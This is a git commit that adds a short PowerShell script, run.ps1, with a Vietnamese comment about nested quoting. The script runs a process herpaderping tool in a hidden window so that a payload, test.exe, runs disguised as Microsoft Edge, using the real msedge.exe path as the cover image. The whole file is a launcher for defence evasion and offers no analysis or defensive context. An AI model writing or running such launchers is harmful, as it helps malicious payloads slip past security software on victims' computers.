efbe1e1223c87b033391f85beb412dc8cf65ddd8
AnhNH <97667309+Haianh58@users.noreply.github.com>
2026-04-08 15:25:56 +0700

    Add files via upload

---
+++ run.ps1
@@ -0,0 +1,8 @@
+﻿$exe = ".\ProcessHerpaderping.exe"
+$payload = ".\test.exe"
+$target = "edge.exe"
+$realPath = "'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'"
+
+# Cách dùng dấu ngoặc đơn lồng trong dấu ngoặc kép chuẩn:
+$action = "-WindowStyle Hidden -Command & { $exe $payload $target $realPath }"
+Start-Process powershell.exe -ArgumentList $action
